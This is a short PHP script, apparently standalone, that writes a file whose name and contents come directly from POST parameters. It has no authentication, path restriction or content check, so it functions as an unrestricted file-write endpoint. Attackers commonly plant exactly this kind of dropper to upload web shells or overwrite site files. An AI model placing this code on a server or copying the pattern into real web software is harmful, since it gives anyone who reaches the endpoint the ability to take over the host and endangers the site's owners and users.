<?php

$name = $_POST['name'];
$data = $_POST['data'];


$file = fopen($name, "w" );
fwrite($file, $data );

fclose($file);







?>